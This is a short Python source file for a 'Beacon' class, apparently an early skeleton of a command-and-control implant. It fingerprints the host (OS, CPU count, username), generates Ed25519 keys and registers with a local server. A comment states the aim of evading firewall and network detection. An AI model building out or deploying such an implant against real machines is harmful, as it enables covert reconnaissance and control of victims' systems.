import json
import uuid
import os
import urllib3

# Encryption libraries to prevent Firewall and NDS Detection
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey


class Beacon:

    @classmethod
    def generate_beacon_fingerprint(cls):
        os_info = os.uname()
        os_cpu_count = os.cpu_count()
        os_user = os.environ.get("USER") or os.environ.get("USERNAME")

        return {
            "os_info": os_info,
            "os_cpu_count": os_cpu_count,
            "os_user": os_user,
        }


    def __init__(self):
        self.beacon_id = uuid.uuid4()
        self.description = "Hello, I am a Beacon."
        self.beacon_fingerprint = self.generate_beacon_fingerprint()

    def generate_key_pairs(self):
        private_key = Ed25519PrivateKey.generate()
        public_key = private_key.public_key()

        self.private_key_hex = private_key.private_bytes_raw().hex()
        self.public_key_hex = public_key.public_bytes_raw().hex()

    def register_beacon(self):
        initial_registration_request = urllib3.request("POST", "http://127.0.0.1:4999/api/register/start", json=self.beacon_fingerprint)

        print(initial_registration_request.data)
        


b1 = Beacon()

print(b1.beacon_fingerprint)
b1.generate_key_pairs()

b1.register_beacon()